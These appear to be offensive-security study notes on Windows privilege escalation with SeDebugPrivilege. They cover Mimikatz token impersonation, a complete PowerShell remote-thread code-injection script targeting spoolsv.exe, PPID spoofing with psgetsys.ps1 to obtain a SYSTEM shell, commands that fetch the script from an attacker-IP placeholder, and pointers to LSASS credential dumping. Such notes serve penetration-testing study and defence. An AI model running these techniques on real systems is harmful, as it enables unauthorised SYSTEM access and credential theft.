---
created: 2026-02-10
updated: 2026-09-18
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---

> [!abstract]+ **Scope**: `SeDebugPrivilege`; token impersonation via Incognito and Mimikatz; remote process shellcode injection; Parent Process ID (PPID) spoofing; handling access to protected processes like LSASS.

- [ ] Confirm your current user has `SeDebugPrivilege` assigned (either directly or inherited from a group) and determine whether it's enabled.
- [ ] If the privilege is present but disabled, enable it in the process that will perform the privileged operation (e.g., using Mimikatz's `privilege::debug` or [`EnableAllTokenPrivs.ps1`](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1) in PowerShell).
- [ ] Choose an exploitation path: duplicate a privileged process token, inject code into a `SYSTEM` process, create a process using a `SYSTEM` parent, or access LSASS process memory.
- [ ] Verify privilege escalation.

## `SeDebugPrivilege`

>**`SeDebugPrivilege`** is a Windows user right that allows a process to bypass normal discretionary access checks when opening handles to other processes and threads.

- Even when the target process runs under a higher-privileged account (such as `NT AUTHORITY\SYSTEM`) or is protected by restrictive DACLs, an enabled `SeDebugPrivilege` allows the caller to bypass normal discretionary access checks during `OpenProcess()` or `OpenThread()`.
- This allows the caller process to obtain a handle to the target process with access rights that would otherwise be denied, including `PROCESS_VM_READ`, `PROCESS_VM_WRITE`, `PROCESS_VM_OPERATION`, `PROCESS_CREATE_PROCESS`, `PROCESS_CREATE_THREAD`, `PROCESS_DUP_HANDLE`, and `PROCESS_ALL_ACCESS`.

>[!info] Although `SeDebugPrivilege` bypasses DACL checks, access can still be subject to additional restrictions such as PPL (Protected Process Light).

> [!note] See [[Windows privileges#SeDebugPrivilege]].

- `SeDebugPrivilege` privilege escalation vectors:

	- **Dumping LSASS memory**
		- Opening a handle to `lsass.exe` with `PROCESS_VM_READ` to read its process memory and extract credential material.
	- **Impersonating tokens**
		- Opening a handle to a higher-privileged process (e.g., `winlogon.exe`, `lsass.exe`) and obtaining its primary token, then duplicating and using the token to impersonate the account or create a process under its security context.
	- **Injecting code into processes**
		- Opening a handle to a `SYSTEM` process with `PROCESS_ALL_ACCESS` or `PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD` to allocate memory, writing code into the target process, and executing it.
	- **Parent process ID (PPID) spoofing**
		- Opening a handle to a `SYSTEM` process with `PROCESS_CREATE_PROCESS`, then using it to *create a new child process with the spoofed parent ID instead of the actual calling process*. This makes it look like the new process was spawned by a legitimate system process rather than the actual parent.

## Enumerating and enabling privileges

- Check if `SeDebugPrivilege` is present in your access token:

```powershell
whoami /priv
```

- Even if the privilege is present in the output but marked `Disabled`, Windows won't consider it during access checks. You need to enable the privilege first before using it.
- In your current PowerShell session, you can use [`EnableAllTokenPrivs.ps1`](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1):

```powershell
Import-Module .\EnableAllTokenPrivs.ps1
```
```powershell
.\EnableAllTokenPrivs.ps1
```
```powershell
whoami /priv
```

- Alternatively, you can use Mimikatz's `privilege::debug`:

```powershell
mimikatz.exe
```
```powershell
privilege::debug
```

## Dumping LSASS memory

- The Local Security Authority Subsystem Service (LSASS) runs under `NT AUTHORITY\SYSTEM`, manages active logon sessions, and stores authentication material in memory, including Kerberos tickets and NTLM password hashes.
- Access to the LSASS process is normally restricted by its security descriptor; unprivileged users can't open it with access rights sufficient to read its memory.
- `SeDebugPrivilege` allows a process to bypass the normal discretionary access checks. With this privilege, you can open a handle to `lsass.exe`, read its memory, and **extract credentials stored there**.

>[!note] See [[Dumping LSASS memory]].

>[!note]+ PPL and Credential Guard
>![[Dumping LSASS memory#LSA Protection (PPL)]]
>---
>![[Dumping LSASS memory#Credential Guard]]

## Impersonating tokens

- `SeDebugPrivilege` allows the caller to open a handle to a higher-privileged process (e.g., `winlogon.exe` or `lsass.exe`), bypassing normal discretionary access checks. The caller can then use `OpenProcessToken()` to *obtain a handle to the process's primary token*.
- The token can then be duplicated with `DuplicateTokenEx()` and used either as an **impersonation token**, which can be assigned to a thread to impersonate the privileged account, or a **primary token**, which can be used to create a process under the privileged account's security context.

### Impersonating tokens with Mimikatz

- Start Mimikatz:

```powershell
mimikatz.exe
```

1. Enable `SeDebugPrivilege`:

```powershell
privilege::debug
```

2. Use [`token::list`](https://tools.thehacker.recipes/mimikatz/modules/token/list) to list accessible tokens:

```powershell
token::list
```

>[!info] A user without `SeDebugPrivilege` can list only their own tokens.

3. List tokens belonging to a specific user whose token you want to impersonate:

```powershell
token::list /user:jdoe
```

4. Use [`token::elevate`](https://tools.thehacker.recipes/mimikatz/modules/token/elevate) to impersonate the selected token:

```bash
token::elevate /id:<token_id>
```

| Option | Description                                    |
| ------ | ---------------------------------------------- |
| `/id`  | Specify the token ID to use for impersonation. |
## Injecting code into processes

- `SeDebugPrivilege` allows a caller to open handles to processes — including those running under higher-privileged security contexts, such as `SYSTEM` — bypassing discretionary control checks that would otherwise restrict access. 
- It gives sufficient privileges to obtain access rights required to read and modify process memory (such as `PROCESS_VM_WRITE | PROCESS_VM_OPERATION`), and to create remote threads (with `PROCESS_CREATE_THREAD`).
- This allows you to use the handle to **write arbitrary code into the target process memory** and then **create a remote thread to execute the payload**.

>[!info] **Remote threads** in Windows allow a process to create and execute a new thread within the virtual address space of a **different process** (here, "remote" means another process, not a remote system).
### Executing code injection

1. Identify a target process running as `SYSTEM` (such as `spoolsv.exe` or `services.exe`):

```powershell
Get-Process -Name spoolsv | Select-Object Name, Id
```

2. Define the required Win32 APIs and inject a minimal payload:

```powershell
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Native
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint access,
        bool inheritHandle,
        uint processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr process,
        IntPtr address,
        UIntPtr size,
        uint allocationType,
        uint protection);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr process,
        IntPtr address,
        byte[] buffer,
        UIntPtr size,
        out UIntPtr written);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr process,
        IntPtr threadAttributes,
        UIntPtr stackSize,
        IntPtr startAddress,
        IntPtr parameter,
        uint creationFlags,
        out uint threadId);
}
"@

$PROCESS_CREATE_THREAD = 0x0002
$PROCESS_VM_OPERATION  = 0x0008
$PROCESS_VM_WRITE      = 0x0020

$MEM_COMMIT  = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40

$pid = (Get-Process -Name spoolsv).Id

# Open a handle to the target process.
$hProcess = [Native]::OpenProcess(
    $PROCESS_CREATE_THREAD -bor $PROCESS_VM_OPERATION -bor $PROCESS_VM_WRITE,
    $false,
    [uint32]$pid
)

if ($hProcess -eq [IntPtr]::Zero) {
    throw "OpenProcess failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}

# Minimal x64 payload: RET.
$payload = [byte[]](0xC3)

# Allocate executable memory in the target process.
$address = [Native]::VirtualAllocEx(
    $hProcess,
    [IntPtr]::Zero,
    [UIntPtr]$payload.Length,
    $MEM_COMMIT -bor $MEM_RESERVE,
    $PAGE_EXECUTE_READWRITE
)

if ($address -eq [IntPtr]::Zero) {
    throw "VirtualAllocEx failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}

# Write the payload into the allocated memory.
[UIntPtr]$written = [UIntPtr]::Zero

if (-not [Native]::WriteProcessMemory(
    $hProcess,
    $address,
    $payload,
    [UIntPtr]$payload.Length,
    [ref]$written
)) {
    throw "WriteProcessMemory failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}

# Create a thread whose start address is the injected payload.
[uint32]$threadId = 0

$hThread = [Native]::CreateRemoteThread(
    $hProcess,
    [IntPtr]::Zero,
    [UIntPtr]::Zero,
    $address,
    [IntPtr]::Zero,
    0,
    [ref]$threadId
)

if ($hThread -eq [IntPtr]::Zero) {
    throw "CreateRemoteThread failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}
```

>[!note]+ Code breakdown
> - `OpenProcess()`
>     - `PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE`: Requests the process access rights required for this example.
>     - Returns a handle to the target process.
> - `VirtualAllocEx()`
>     - `MEM_COMMIT | MEM_RESERVE`: Reserves and commits memory in the target process.
>     - `PAGE_EXECUTE_READWRITE`: Creates memory that can be written to and executed.
> - `WriteProcessMemory()`
>     - `$payload`: Writes the payload bytes into the allocated memory.
> - `CreateRemoteThread()`
>     - `$address`: Starts a new thread in the target process at the address containing the injected payload.

> [!warning] Injecting code into core system processes like `lsass.exe` or `csrss.exe` can crash the OS. Target noncritical background services like `spoolsv.exe`.

## Spoofing parent process IDs

>**Parent Process ID (PPID) spoofing** is a technique used to manipulate process creation attributes to make a new process appear spawned by an arbitrary process as its parent, such as a trusted higher-privileged process.

- By default, a child process is created using the primary token of the calling process. The calling process becomes the **parent process** of the newly created process.
- When creating a new process, it is possible to specify the `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` extended attribute to designate a different process as its parent. Windows then uses attributes inherited from the designated parent, including its process token, instead of those of the actual calling process.
- If the designated parent process runs under `NT AUTHORITY\SYSTEM`, the child process executes within the `SYSTEM` security context.
- Assigning a parent process requires opening a process handle to the target with `PROCESS_CREATE_PROCESS` rights; `SeDebugPrivilege` can bypass DACL to do that for higher-privileged processes.

> [!note] See [`Getting SYSTEM — Decoder's Blog`](https://decoder.cloud/2018/02/02/getting-system/).

1. Transfer [`psgetsys.ps1`](https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1) to the target host:

```bash
wget https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
```
```bash
python3 -m http.server 8080
```

```powershell
Invoke-WebRequest -Uri "http://<attacker_ip_address>:8080/psgetsys.ps1" -OutFile "psgetsys.ps1"
```

2. Identify the PID of an accessible process running as `SYSTEM` (such as `lsass`):

```powershell
Get-Process -Name lsass | Select-Object Name, Id
```

- Common choices:

| Process        | Description                                                                 |
| -------------- | --------------------------------------------------------------------------- |
| `lsass.exe`    | Local Security Authority process; normally runs as `SYSTEM` in session `0`. |
| `services.exe` | Service Control Manager (SCM); normally runs as `SYSTEM` in session `0`.    |
| `winlogon.exe` | Windows logon process; normally runs as `SYSTEM`.                           |

3. Import the script:

```powershell
Import-Module .\psgetsys.ps1
```

- Then you can use `ImpersonateFromParentPid` to create a command prompt whose designated parent is `lsass.exe`:

```powershell
ImpersonateFromParentPid `
    -ppid (Get-Process services).Id `
    -command "C:\Windows\System32\cmd.exe" `
    -cmdargs ""
```

>[!info] `ImpersonateFromParentPid` uses `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to designate the specified process as the new process's parent. The resulting child process inherits attributes from that parent, including its primary token. In other words, you get `cmd.exe` as `SYSTEM`.

- Other than `cmd.exe`, you can launch a custom executable:

```powershell
ImpersonateFromParentPid `
	-ppid (Get-Process -Name lsass).Id `
	-command "C:\Windows\Temp\shell.exe" `
	-cmdargs ""
```

| Parameter  | Description                                      | Example                         |
| ---------- | ------------------------------------------------ | ------------------------------- |
| `-ppid`    | PID of the process designated as the parent.     | `(Get-Process -Name lsass).Id`  |
| `-command` | Path to the executable to create.                | `"C:\Windows\System32\cmd.exe"` |
| `-cmdargs` | Command-line arguments passed to the executable. | `""`                            |

## References and further reading

- [`Debug programs — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs)
- [`token::list — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/token/list)
- [`token::elevate — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/token/elevate)
- [`Getting SYSTEM — Decoder's Blog`](https://decoder.cloud/2018/02/02/getting-system/)
- [`Child processes — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/procthread/child-processes)
- [`Parent Process ID (PPID) spoofing — Red Team Notes`](https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing)

---
- `TODO`:
	- `token::elevate /domainadmin`
	- `Incognito`

